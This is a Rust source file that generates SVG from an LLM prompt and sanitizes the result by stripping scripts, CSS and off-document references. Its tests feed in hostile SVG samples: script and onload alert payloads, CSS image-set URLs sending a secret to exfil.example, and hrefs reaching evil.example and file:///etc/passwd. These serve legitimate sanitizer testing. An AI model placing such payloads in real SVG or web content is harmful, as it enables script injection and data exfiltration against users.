//! LLM-prompted SVG generation, sanitized before return. Part of the
//! Aivyx-Vision toolset (see `aivyx-ecosystem/docs/superpowers/specs/
//! 2026-09-18-aivyx-vision-v1-design.md`) -- the vector/graphic-design
//! milestone, which deliberately needs no image/3D generation engine at
//! all: it prompts the *caller's own already-configured* text-completion
//! backend (see `TextCompleter`) and sanitizes whatever SVG markup comes
//! back.

use async_trait::async_trait;
use svg_hush::{Filter, data_url_filter};
use xml::attribute::Attribute;
use xml::reader::{ParserConfig, XmlEvent as REvent};
use xml::writer::{EmitterConfig, XmlEvent as WEvent};

/// A minimal, product-agnostic "turn a prompt into text" seam. Each
/// product's own adapter (out of scope for this crate) implements this
/// by delegating to its real, already-configured LLM provider --
/// `aivyx-pa`'s `LlmProvider` or `aivyx-coder`'s `LlmBackend`. This crate
/// never talks to a model directly and has no opinion on which provider
/// backs it, no streaming, no cancellation -- just one prompt in, one
/// completion out.
#[async_trait]
pub trait TextCompleter: Send + Sync {
    async fn complete(&self, prompt: &str) -> Result<String, TextCompleterError>;
}

/// An error from the caller-supplied [`TextCompleter`]. Opaque by
/// design -- this crate doesn't know or care whether the real backend is
/// Ollama, Anthropic, a local llama-server, or something else; the
/// message is whatever the adapter chose to surface.
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
#[error("text completion failed: {0}")]
pub struct TextCompleterError(pub String);

/// Everything that can go wrong generating an SVG.
#[derive(Debug, thiserror::Error)]
#[non_exhaustive]
pub enum SvgGenerationError {
    #[error(transparent)]
    Completion(#[from] TextCompleterError),
    #[error("no <svg>...</svg> markup found in the completion response")]
    NoSvgFound,
    #[error("SVG sanitization failed: {0}")]
    Sanitization(String),
}

/// Pull the `<svg>...</svg>` block out of an arbitrary completion
/// response. Finds the first `<svg` and the last `</svg>` in the whole
/// response and slices between them (inclusive). This tolerates a
/// markdown code fence around the block, and prose that doesn't itself
/// mention `<svg>` before the real block. A response that mentions `<svg`
/// in prose ahead of the actual fenced block will fail sanitization with
/// an XML-parsing error rather than being correctly extracted -- a known,
/// accepted limitation, not silently wrong (it fails closed, never emits
/// a truncated or wrong block). Returns `None` if no `<svg`/`</svg>` pair
/// is present, or if the `</svg>` found is before the `<svg` found
/// (malformed / truncated response).
fn extract_svg_markup(response: &str) -> Option<&str> {
    let start = response.find("<svg")?;
    let end = response.rfind("</svg>")? + "</svg>".len();
    if end <= start {
        return None;
    }
    Some(&response[start..end])
}

/// Largest extracted `<svg>` block, in bytes, that [`generate_svg`] will
/// sanitize. Larger input is rejected with
/// [`SvgGenerationError::Sanitization`] rather than processed.
pub const MAX_SVG_INPUT_BYTES: usize = 256 * 1024;

/// Deepest element nesting [`generate_svg`] will sanitize. Deeper input is
/// rejected with [`SvgGenerationError::Sanitization`]: `svg-hush`
/// pretty-prints its output, so its size grows with the square of the
/// nesting depth.
pub const MAX_SVG_DEPTH: usize = 64;

const SYSTEM_PROMPT: &str = "\
You are generating a single, self-contained SVG image for the request \
below. Respond with ONLY the SVG markup, starting with `<svg` and ending \
with `</svg>`. The root `<svg>` element MUST include the attribute \
`xmlns=\"http://www.w3.org/2000/svg\"`. Do not include any explanation, \
and do not reference any external file, URL, font, or resource -- \
everything must be inline within the SVG itself. Style elements with \
presentation attributes such as `fill`, `stroke`, and `font-size`, not \
CSS: `<style>` elements and `style` attributes are removed.\n\nRequest: ";

/// Prompt `completer` for an SVG matching `user_prompt`, extract the SVG
/// markup from its response, sanitize it (strip scripting, all CSS, and
/// every reference outside the document -- see `sanitize_svg`), and return
/// the clean SVG source. This is the crate's one public entry point.
///
/// Input over [`MAX_SVG_INPUT_BYTES`] or nested deeper than
/// [`MAX_SVG_DEPTH`] is rejected with [`SvgGenerationError::Sanitization`].
///
/// The returned string is always a full XML document -- it begins with an
/// `<?xml version="1.0" encoding="utf-8"?>` processing instruction, not a
/// bare `<svg>...</svg>` fragment, so a caller splicing this directly into
/// an existing HTML document should strip the leading declaration first.
/// It is not indented.
pub async fn generate_svg(
    completer: &dyn TextCompleter,
    user_prompt: &str,
) -> Result<String, SvgGenerationError> {
    let full_prompt = format!("{SYSTEM_PROMPT}{user_prompt}");
    let raw = completer.complete(&full_prompt).await?;
    let extracted = extract_svg_markup(&raw).ok_or(SvgGenerationError::NoSvgFound)?;
    sanitize_svg(extracted)
}

/// Sanitize `svg` in three steps, each fail-closed:
///
/// 1. [`check_input_limits`] rejects input over [`MAX_SVG_INPUT_BYTES`] or
///    nested deeper than [`MAX_SVG_DEPTH`].
/// 2. `svg-hush`'s allowlist-based filter strips `<script>`, `on*`
///    event-handler attributes, `<foreignObject>` and other non-SVG
///    elements, and every `data:` URL except inline PNG/JPEG/GIF
///    (`data_url_filter::allow_standard_images` -- `svg-hush`'s own default
///    drops ALL `data:` URLs, so this is a deliberate relaxation: it exists
///    because `SYSTEM_PROMPT` requires embedded resources to be inline).
/// 3. [`restrict_to_in_document_content`] post-filters `svg-hush`'s output,
///    because `svg-hush` alone is not enough: it leaves CSS `image-set("…")`
///    URLs untouched (a real cross-origin fetch in Chrome), and it
///    *rewrites* off-document references to same-origin paths rather than
///    removing them (`https://evil/x` becomes `/x`). This step removes all
///    CSS and every reference that does not point inside the document.
///
/// SVG is executable-ish content, so this is load-bearing, not optional
/// polish. The returned string is a full XML document (leading
/// `<?xml ...?>` declaration), not a bare `<svg>...</svg>` fragment --
/// see [`generate_svg`]'s doc comment.
fn sanitize_svg(svg: &str) -> Result<String, SvgGenerationError> {
    check_input_limits(svg)?;
    let mut filter = Filter::new();
    filter.set_data_url_filter(data_url_filter::allow_standard_images);
    let mut hushed = Vec::new();
    filter
        .filter(&mut svg.as_bytes(), &mut hushed)
        .map_err(|e| SvgGenerationError::Sanitization(describe_error(&e)))?;
    restrict_to_in_document_content(&hushed)
}

/// Reject input that would make `svg-hush`'s pretty-printed output blow
/// up (its indentation makes output size quadratic in nesting depth).
/// Malformed XML is not an error here: it is left for `svg-hush` to
/// reject with its own, more specific message.
fn check_input_limits(svg: &str) -> Result<(), SvgGenerationError> {
    if svg.len() > MAX_SVG_INPUT_BYTES {
        return Err(SvgGenerationError::Sanitization(format!(
            "SVG is {} bytes, over the {MAX_SVG_INPUT_BYTES}-byte limit",
            svg.len()
        )));
    }
    let reader = ParserConfig::new()
        .ignore_comments(true)
        .max_entity_expansion_depth(3)
        .create_reader(svg.as_bytes());
    let mut depth = 0usize;
    for event in reader {
        match event {
            Ok(REvent::StartElement { .. }) => {
                depth += 1;
                if depth > MAX_SVG_DEPTH {
                    return Err(SvgGenerationError::Sanitization(format!(
                        "SVG element nesting depth exceeds the limit of {MAX_SVG_DEPTH}"
                    )));
                }
            }
            Ok(REvent::EndElement { .. }) => depth = depth.saturating_sub(1),
            Ok(REvent::EndDocument) | Err(_) => break,
            Ok(_) => {}
        }
    }
    Ok(())
}

/// Elements whose whitespace-only text nodes are content, not indentation.
const TEXT_CONTENT_ELEMENTS: &[&str] = &["text", "tspan", "textPath", "title", "desc"];

/// Re-emit `svg-hush`'s (already well-formed, prefix-free) output, keeping
/// only content that cannot reach outside the document:
///
/// - `<style>` elements and `style` attributes are dropped entirely, with
///   their content. CSS has fetch syntax `svg-hush` does not filter
///   (`image-set()`, `-webkit-image-set()`, `cross-fade()`) and escape
///   syntax that defeats its `url()` rewriting. Presentation attributes
///   (`fill`, `stroke`, ...) cover what generated images need.
/// - `href` (and the other URL-typed attributes) are kept only if they are
///   a same-document fragment (`#id`) or a `data:` URL that `svg-hush`
///   already allowed. Anything else -- which `svg-hush` would have
///   rewritten to a same-origin path -- is dropped.
/// - Any other attribute is dropped if it contains a `url(...)` whose
///   target is not a fragment or `data:` URL, a CSS escape (`\`), or
///   fetching CSS syntax.
/// - Indentation is not re-added (whitespace is kept verbatim only inside
///   text content), so output size tracks input size.
fn restrict_to_in_document_content(hushed: &[u8]) -> Result<String, SvgGenerationError> {
    let sanitization =
        |e: &dyn std::error::Error| SvgGenerationError::Sanitization(describe_error(e));
    let reader = ParserConfig::new()
        .ignore_comments(true)
        .create_reader(hushed);
    let mut out = Vec::with_capacity(hushed.len());
    let mut writer = EmitterConfig::new()
        .perform_indent(false)
        .pad_self_closing(false)
        .create_writer(&mut out);

    // Open elements, so whitespace can be kept inside text content only.
    let mut open: Vec<String> = Vec::new();
    let mut skipping = 0usize;
    for event in reader {
        let event = event.map_err(|e| sanitization(&e))?;
        match event {
            REvent::StartDocument { version, .. } => writer
                .write(WEvent::StartDocument {
                    version,
                    encoding: Some("utf-8"),
                    standalone: None,
                })
                .map_err(|e| sanitization(&e))?,
            REvent::StartElement {
                name,
                attributes,
                namespace,
            } => {
                if skipping > 0 || name.local_name == "style" {
                    skipping += 1;
                    continue;
                }
                let kept: Vec<Attribute<'_>> = attributes
                    .iter()
                    .filter(|a| attribute_is_in_document(&a.name.local_name, &a.value))
                    .map(|a| a.borrow())
                    .collect();
                writer
                    .write(WEvent::StartElement {
                        name: name.borrow(),
                        attributes: kept.into(),
                        namespace: std::borrow::Cow::Borrowed(&namespace),
                    })
                    .map_err(|e| sanitization(&e))?;
                open.push(name.local_name);
            }
            REvent::EndElement { .. } => {
                if skipping > 0 {
                    skipping -= 1;
                    continue;
                }
                open.pop();
                writer
                    .write(WEvent::end_element())
                    .map_err(|e| sanitization(&e))?;
            }
            REvent::Characters(text) if skipping == 0 => writer
                .write(WEvent::Characters(&text))
                .map_err(|e| sanitization(&e))?,
            REvent::Whitespace(text)
                if skipping == 0
                    && open
                        .iter()
                        .any(|n| TEXT_CONTENT_ELEMENTS.contains(&n.as_str())) =>
            {
                writer
                    .write(WEvent::Characters(&text))
                    .map_err(|e| sanitization(&e))?
            }
            REvent::EndDocument => break,
            _ => {}
        }
    }
    String::from_utf8(out).map_err(|e| sanitization(&e))
}

/// Whether one attribute (already passed by `svg-hush`) is free of
/// references outside the document. See [`restrict_to_in_document_content`].
fn attribute_is_in_document(name: &str, value: &str) -> bool {
    if name == "style" {
        return false;
    }
    if matches!(name, "href" | "base" | "color-profile") {
        return is_in_document_target(value);
    }
    let lower = value.to_ascii_lowercase();
    if value.contains('\\')
        || ["image-set(", "cross-fade(", "@import", "src("]
            .iter()
            .any(|f| lower.contains(f))
    {
        return false;
    }
    lower.match_indices("url(").all(|(i, _)| {
        let target = &value[i + "url(".len()..];
        let target = target.split(')').next().unwrap_or("");
        is_in_document_target(target.trim().trim_matches(['"', '\'']).trim())
    })
}

/// A same-document fragment (`#id`, including `svg-hush`'s neutralized
/// `url(#)` placeholder) or a `data:` URL. `data:` URLs reaching this point
/// already passed `svg-hush`'s image-only data-URL filter.
fn is_in_document_target(target: &str) -> bool {
    let target = target.trim();
    target.starts_with('#')
        || target
            .get(..5)
            .is_some_and(|scheme| scheme.eq_ignore_ascii_case("data:"))
}

/// Walk an error's `source()` chain and join every level's `Display`
/// message with `": "`, so detail that only lives deeper in the chain
/// (e.g. `svg-hush`'s `FError::Writer`'s generic "XML encoding error"
/// hides the actionable "No acceptable SVG elements found" one level
/// down) isn't discarded when the error is turned into a message string.
fn describe_error(err: &dyn std::error::Error) -> String {
    let mut msg = err.to_string();
    let mut source = err.source();
    while let Some(s) = source {
        msg.push_str(": ");
        msg.push_str(&s.to_string());
        source = s.source();
    }
    msg
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    /// A `TextCompleter` test double: returns a canned response (or
    /// error) exactly once, and records the prompt it was called with so
    /// tests can assert what was actually sent.
    struct FakeCompleter {
        response: Mutex<Option<Result<String, TextCompleterError>>>,
        captured_prompt: Mutex<Option<String>>,
    }

    impl FakeCompleter {
        fn returning(response: Result<String, TextCompleterError>) -> Self {
            Self {
                response: Mutex::new(Some(response)),
                captured_prompt: Mutex::new(None),
            }
        }
    }

    #[async_trait]
    impl TextCompleter for FakeCompleter {
        async fn complete(&self, prompt: &str) -> Result<String, TextCompleterError> {
            *self.captured_prompt.lock().unwrap() = Some(prompt.to_string());
            self.response
                .lock()
                .unwrap()
                .take()
                .expect("FakeCompleter.complete called more than once")
        }
    }

    #[tokio::test]
    async fn text_completer_trait_object_is_usable_and_captures_its_prompt() {
        let fake = FakeCompleter::returning(Ok("hello".to_string()));
        let completer: &dyn TextCompleter = &fake;
        let result = completer.complete("a test prompt").await;
        assert_eq!(result.unwrap(), "hello");
        assert_eq!(
            fake.captured_prompt.lock().unwrap().as_deref(),
            Some("a test prompt")
        );
    }

    #[tokio::test]
    async fn text_completer_propagates_its_error() {
        let fake = FakeCompleter::returning(Err(TextCompleterError("backend down".into())));
        let completer: &dyn TextCompleter = &fake;
        let err = completer.complete("prompt").await.unwrap_err();
        assert_eq!(err.0, "backend down");
    }

    #[test]
    fn extract_svg_markup_finds_a_bare_svg_block() {
        let response = "<svg xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"5\"/></svg>";
        assert_eq!(extract_svg_markup(response), Some(response));
    }

    #[test]
    fn extract_svg_markup_strips_a_surrounding_markdown_fence() {
        let response = "Here you go:\n```svg\n<svg><rect/></svg>\n```\nEnjoy!";
        assert_eq!(extract_svg_markup(response), Some("<svg><rect/></svg>"));
    }

    #[test]
    fn extract_svg_markup_returns_none_when_no_svg_tag_present() {
        let response = "I can't generate images.";
        assert_eq!(extract_svg_markup(response), None);
    }

    #[test]
    fn extract_svg_markup_returns_none_for_an_unclosed_svg_tag() {
        let response = "<svg><circle r=\"5\"/>";
        assert_eq!(extract_svg_markup(response), None);
    }

    #[tokio::test]
    async fn generate_svg_returns_clean_svg_from_a_fenced_response() {
        let fake = FakeCompleter::returning(Ok(
            "```svg\n<svg xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"5\"/></svg>\n```"
                .to_string(),
        ));
        let svg = generate_svg(&fake, "a small red circle").await.unwrap();
        assert!(svg.contains("<svg"));
        assert!(svg.contains("<circle"));
        assert!(!svg.contains("```"));
    }

    #[tokio::test]
    async fn generate_svg_sends_the_user_prompt_to_the_completer() {
        let fake = FakeCompleter::returning(Ok(
            "<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>".to_string()
        ));
        generate_svg(&fake, "a purple hexagon icon").await.unwrap();
        let sent = fake.captured_prompt.lock().unwrap().clone().unwrap();
        assert!(sent.contains("a purple hexagon icon"));
    }

    #[tokio::test]
    async fn generate_svg_errors_when_no_svg_is_present() {
        let fake = FakeCompleter::returning(Ok("I can't draw that.".to_string()));
        let err = generate_svg(&fake, "anything").await.unwrap_err();
        assert!(matches!(err, SvgGenerationError::NoSvgFound));
    }

    #[tokio::test]
    async fn generate_svg_propagates_completer_errors() {
        let fake = FakeCompleter::returning(Err(TextCompleterError("timed out".into())));
        let err = generate_svg(&fake, "anything").await.unwrap_err();
        assert!(matches!(err, SvgGenerationError::Completion(_)));
    }

    #[tokio::test]
    async fn generate_svg_strips_a_script_tag() {
        let fake = FakeCompleter::returning(Ok(
            "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script>\
             <circle r=\"5\"/></svg>"
                .to_string(),
        ));
        let svg = generate_svg(&fake, "a circle").await.unwrap();
        assert!(
            !svg.to_lowercase().contains("script"),
            "sanitizer must strip <script> entirely, got: {svg}"
        );
        assert!(
            svg.contains("circle"),
            "sanitizer must keep the safe content"
        );
    }

    #[tokio::test]
    async fn generate_svg_strips_an_onload_handler_attribute() {
        let fake = FakeCompleter::returning(Ok(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">\
             <circle r=\"5\"/></svg>"
                .to_string(),
        ));
        let svg = generate_svg(&fake, "a circle").await.unwrap();
        assert!(
            !svg.to_lowercase().contains("onload"),
            "sanitizer must strip onload handler attributes entirely, got: {svg}"
        );
        assert!(
            svg.contains("circle"),
            "sanitizer must keep the safe content"
        );
    }

    #[tokio::test]
    async fn generate_svg_strips_a_foreign_object_element() {
        let fake = FakeCompleter::returning(Ok(
            "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject>\
             <body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)\
             </script></body></foreignObject><circle r=\"5\"/></svg>"
                .to_string(),
        ));
        let svg = generate_svg(&fake, "a circle").await.unwrap();
        assert!(
            !svg.to_lowercase().contains("foreignobject"),
            "sanitizer must strip <foreignObject> entirely, got: {svg}"
        );
        assert!(
            svg.contains("circle"),
            "sanitizer must keep the safe content"
        );
    }

    #[tokio::test]
    async fn generate_svg_errors_clearly_when_response_omits_the_svg_namespace() {
        let fake = FakeCompleter::returning(Ok("<svg><circle r=\"5\"/></svg>".to_string()));
        let err = generate_svg(&fake, "a circle").await.unwrap_err();
        assert!(
            matches!(err, SvgGenerationError::Sanitization(_)),
            "an svg with no xmlns must fail sanitization cleanly, not panic or \
             silently produce garbage, got: {err:?}"
        );
    }

    /// Cross-origin references are removed, not rewritten: `svg-hush`
    /// alone would turn this into `href="/track.png"`, a same-origin
    /// request the model controls (see `restrict_to_in_document_content`).
    #[tokio::test]
    async fn generate_svg_drops_a_cross_origin_reference() {
        let fake = FakeCompleter::returning(Ok("<svg xmlns=\"http://www.w3.org/2000/svg\">\
             <image href=\"https://some-external-host.example/track.png\"/>\
             <circle r=\"5\"/></svg>"
            .to_string()));
        let svg = generate_svg(&fake, "a circle").await.unwrap();
        assert!(
            !svg.contains("some-external-host.example") && !svg.contains("track.png"),
            "no off-document reference may survive sanitization, got: {svg}"
        );
        assert!(
            svg.contains("circle"),
            "sanitizer must keep the safe content"
        );
    }

    /// Pins the data-URL policy documented on `sanitize_svg`: an inline
    /// `data:image/png` URL is a permitted, deliberate relaxation of
    /// `svg-hush`'s own default (which drops all `data:` URLs), and must
    /// survive sanitization untouched. Nothing else in the suite exercises
    /// this, so a future `svg-hush` version bump that changes the default
    /// would otherwise go unnoticed.
    #[tokio::test]
    async fn generate_svg_keeps_an_inline_png_data_url() {
        let fake = FakeCompleter::returning(Ok("<svg xmlns=\"http://www.w3.org/2000/svg\">\
             <image href=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB\
             AQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=\"/>\
             </svg>"
            .to_string()));
        let svg = generate_svg(&fake, "an image").await.unwrap();
        assert!(
            svg.contains("data:image/png"),
            "an inline PNG data URL must survive sanitization, got: {svg}"
        );
    }

    const NS: &str = "xmlns=\"http://www.w3.org/2000/svg\"";

    async fn sanitize_via_generate(body: &str) -> Result<String, SvgGenerationError> {
        let fake = FakeCompleter::returning(Ok(format!("<svg {NS}>{body}</svg>")));
        generate_svg(&fake, "anything").await
    }

    /// Audit 2026-10-04 V1: svg-hush leaves CSS `image-set("...")` untouched
    /// in a `<style>` element; Chrome fetched the URL from sanitized output.
    #[tokio::test]
    async fn generate_svg_drops_image_set_in_a_style_element() {
        let svg = sanitize_via_generate(
            "<style>svg{background-image:image-set(\"http://exfil.example/bg?secret=abc\" 1x)}\
             </style><circle r=\"5\"/>",
        )
        .await
        .unwrap();
        assert!(
            !svg.contains("exfil.example"),
            "image-set URL survived: {svg}"
        );
        assert!(svg.contains("circle"));
    }

    #[tokio::test]
    async fn generate_svg_drops_image_set_in_a_style_attribute() {
        let svg = sanitize_via_generate(
            "<rect style=\"mask-image:-webkit-image-set(&quot;http://exfil.example/m&quot; 1x)\" \
             width=\"5\" height=\"5\"/>",
        )
        .await
        .unwrap();
        assert!(
            !svg.contains("exfil.example"),
            "image-set URL survived: {svg}"
        );
        assert!(svg.contains("rect"));
    }

    /// Audit V4: an escaped `url()` in CSS was mangled but kept the host text.
    #[tokio::test]
    async fn generate_svg_drops_escaped_css_url_host() {
        let svg = sanitize_via_generate(
            "<style>rect{fill:u\\72l(https://evil.example/x)}</style><rect width=\"5\"/>",
        )
        .await
        .unwrap();
        assert!(!svg.contains("evil.example"), "host survived: {svg}");
    }

    /// Audit V3: off-document references were rewritten to same-origin paths
    /// (`https://evil/x` -> `/x`, `file:///etc/passwd` -> `/etc/passwd`); they
    /// must be dropped instead.
    #[tokio::test]
    async fn generate_svg_drops_off_document_references_instead_of_rewriting() {
        let svg = sanitize_via_generate(
            "<image href=\"https://evil.example/track.png\"/>\
             <image href=\"file:///etc/passwd\"/>\
             <use href=\"../../secret.svg#a\"/>\
             <rect fill=\"url(https://evil.example/paint.svg#p)\" width=\"5\"/>\
             <circle r=\"5\"/>",
        )
        .await
        .unwrap();
        for leaked in ["track.png", "passwd", "secret.svg", "paint.svg"] {
            assert!(!svg.contains(leaked), "{leaked} reference survived: {svg}");
        }
        assert!(svg.contains("circle"));
    }

    #[tokio::test]
    async fn generate_svg_keeps_in_document_references() {
        let svg = sanitize_via_generate(
            "<defs><linearGradient id=\"g\"><stop offset=\"0\"/></linearGradient>\
             <circle id=\"c\" r=\"5\"/></defs>\
             <rect fill=\"url(#g)\" width=\"5\"/><use href=\"#c\"/>",
        )
        .await
        .unwrap();
        assert!(svg.contains("url(#g)"), "fragment url() was dropped: {svg}");
        assert!(
            svg.contains("href=\"#c\""),
            "fragment href was dropped: {svg}"
        );
    }

    fn nested_groups(depth: usize) -> String {
        format!(
            "{}<circle r=\"5\"/>{}",
            "<g>".repeat(depth),
            "</g>".repeat(depth)
        )
    }

    /// Audit V2: svg-hush's pretty-printing grows quadratically with nesting
    /// (depth 4000 -> 32 MB). Deep input must be rejected.
    #[tokio::test]
    async fn generate_svg_rejects_excessive_nesting() {
        let err = sanitize_via_generate(&nested_groups(1000))
            .await
            .unwrap_err();
        assert!(
            matches!(&err, SvgGenerationError::Sanitization(m) if m.contains("depth")),
            "got: {err:?}"
        );
    }

    #[tokio::test]
    async fn generate_svg_rejects_oversized_input() {
        let body = "<rect width=\"5\" height=\"5\"/>".repeat(MAX_SVG_INPUT_BYTES / 20);
        let err = sanitize_via_generate(&body).await.unwrap_err();
        assert!(
            matches!(&err, SvgGenerationError::Sanitization(m) if m.contains("bytes")),
            "got: {err:?}"
        );
    }

    #[tokio::test]
    async fn generate_svg_output_is_not_amplified_by_nesting() {
        let body = nested_groups(MAX_SVG_DEPTH - 2);
        let input_len = body.len() + 60;
        let svg = sanitize_via_generate(&body).await.unwrap();
        assert!(
            svg.len() <= input_len * 2,
            "output {} bytes for {} bytes of input",
            svg.len(),
            input_len
        );
    }

    /// Combines a markdown fence, surrounding prose, an `onload` handler,
    /// and a `<script>` tag in one response -- extraction and
    /// sanitization are each tested individually elsewhere, but never
    /// together. This confirms the composition works end to end.
    #[tokio::test]
    async fn generate_svg_sanitizes_correctly_through_a_fence_with_prose_and_hostile_content() {
        let fake = FakeCompleter::returning(Ok("Sure, here's a circle for you:\n\
             ```svg\n\
             <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">\
             <script>alert(2)</script><circle r=\"5\"/></svg>\n\
             ```\n\
             Hope that helps!"
            .to_string()));
        let svg = generate_svg(&fake, "a circle").await.unwrap();
        assert!(
            !svg.to_lowercase().contains("onload"),
            "sanitizer must strip onload handler attributes entirely, got: {svg}"
        );
        assert!(
            !svg.to_lowercase().contains("script"),
            "sanitizer must strip <script> entirely, got: {svg}"
        );
        assert!(
            svg.contains("circle"),
            "sanitizer must keep the safe content"
        );
    }
}
